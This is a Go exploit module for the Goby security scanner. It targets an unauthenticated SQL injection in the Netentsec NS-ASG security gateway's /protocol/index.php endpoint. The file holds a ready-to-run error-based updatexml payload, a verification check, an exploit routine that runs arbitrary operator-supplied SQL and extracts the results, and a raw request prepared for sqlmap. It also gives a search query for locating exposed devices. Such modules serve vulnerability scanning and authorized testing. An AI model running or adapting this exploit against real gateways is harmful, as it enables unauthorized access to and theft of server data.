package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Netentsec NS-ASG Security gateway /protocol/index.php SQL Injection Vulnerability",
    "Description": "<p>Netentsec Technology's NS-ASG Application Security Gateway is a hardware and software integrated product that integrates SSL and IPSec to ensure the security of business access. It is designed to be compatible with all mobile devices, provide multiple link balancing and selection technologies, support flexible combinations of various authentication methods, and include up to 13 authentication methods such as SMS authentication, LDAP token, and USB KEY. </p><p>Its /protocol/index.php interface has a SQL injection vulnerability, allowing unauthenticated attackers to remotely launch attacks and obtain sensitive server data, potentially causing more severe consequences.</p>",
    "Product": "netentsec-NS-ASG-SecGW",
    "Homepage": "https://www.netentsec.com/",
    "DisclosureDate": "2024-03-18",
    "PostTime": "2024-08-30",
    "Author": "hhh3156",
    "FofaQuery": "(title=\"网康NS-ASG应用安全网关\" || title=\"网康应用安全网关\" && body=\"admin/include/vcode.php\") ||title=\"404 Not Found\"",
    "GobyQuery": "(title=\"网康NS-ASG应用安全网关\" || title=\"网康应用安全网关\" && body=\"admin/include/vcode.php\") ||title=\"404 Not Found\"",
    "Level": "2",
    "Impact": "<p>Its /protocol/index.php interface has a SQL injection vulnerability, allowing unauthenticated attackers to remotely launch attacks and obtain sensitive server data, potentially causing more severe consequences.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.netentsec.com/\">https://www.netentsec.com/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select+database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "网康 NS-ASG 安全网关 /protocol/index.php SQL 注入漏洞",
            "Product": "网康科技-NS-ASG安全网关",
            "Description": "<p>网康科技的NS-ASG应用安全网关是一款软硬件一体化的产品，集成了SSL和IPSec,旨在保障业务访问的安全性，适配所有移动终端，提供多种链路均衡和选择技术，支持多种认证方式灵活组合，以及内置短信认证、LDAP令牌、USB KEY等多达13种认证方式。<br></p><p>其&nbsp;/protocol/index.php 接口存在一个SQL注入漏洞，未经身份验证的攻击者可以远程发起攻击获取服务器敏感数据，甚至造成更大的危害。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.netentsec.com/\">https://www.netentsec.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其&nbsp;/protocol/index.php 接口存在一个SQL注入漏洞，未经身份验证的攻击者可以远程发起攻击获取服务器敏感数据，甚至造成更大的危害。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Netentsec NS-ASG Security gateway /protocol/index.php SQL Injection Vulnerability",
            "Product": "netentsec-NS-ASG-SecGW",
            "Description": "<p>Netentsec Technology's NS-ASG Application Security Gateway is a hardware and software integrated product that integrates SSL and IPSec to ensure the security of business access. It is designed to be compatible with all mobile devices, provide multiple link balancing and selection technologies, support flexible combinations of various authentication methods, and include up to 13 authentication methods such as SMS authentication, LDAP token, and USB KEY.&nbsp;</p><p>Its /protocol/index.php interface has a SQL injection vulnerability, allowing unauthenticated attackers to remotely launch attacks and obtain sensitive server data, potentially causing more severe consequences.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.netentsec.com/\">https://www.netentsec.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Its /protocol/index.php interface has a SQL injection vulnerability, allowing unauthenticated attackers to remotely launch attacks and obtain sensitive server data, potentially causing more severe consequences.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9950"
}`

	setSqlPayloadHash_PaifuYTYTYbnvj20236974LApifuyty := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 30
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		urlget := `/protocol/index.php`
		data := `jsoncontent={"protocolType":"addmacbind","messagecontent":["{\"BandIPMacId\":\"1\",\"IPAddr\":\"eth0'and(updatexml(1,concat(0x7e,(` + url.QueryEscape(sql) + `)),1))='\",\"MacAddr\":\"\",\"DestIP\":\"\",\"DestMask\":\"255.255.255.0\",\"Description\":\"Sample+Description\"}"]}`
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Referer":         hostInfo.FixedHostInfo,
		}
		resp, err = setPostRequest(hostInfo, urlget, data, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = urlget

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			MD5 := func(v string) string {
				d := []byte(v)
				m := md5.New()
				m.Write(d)
				return hex.EncodeToString(m.Sum(nil))
			}
			rand.Seed(time.Now().UnixNano())
			randomString := strconv.Itoa(rand.Intn(8999) + 1000)

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := MD5(randomString)[0:30]

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `md5(` + randomString + `)`

			sendPayload := setSqlPayloadHash_PaifuYTYTYbnvj20236974LApifuyty

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /protocol/index.php HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\nContent-Type: application/x-www-form-urlencoded\n\njsoncontent={\"protocolType\":\"addmacbind\",\"messagecontent\":[\"{\\\"BandIPMacId\\\":\\\"1\\\",\\\"IPAddr\\\":\\\"eth0'and(updatexml(1,concat(0x7e,(select+database())),1))='\\\",\\\"MacAddr\\\":\\\"\\\",\\\"DestIP\\\":\\\"\\\",\\\"DestMask\\\":\\\"255.255.255.0\\\",\\\"Description\\\":\\\"Sample+Description\\\"}\"]}"

			// 2.配置正则语句，从响应包中提取出数据
			regular := `XPATH syntax error: '~([\S\s]*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_PaifuYTYTYbnvj20236974LApifuyty
			attacktype := goutils.B2S(ss.Params["attackType"])

			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
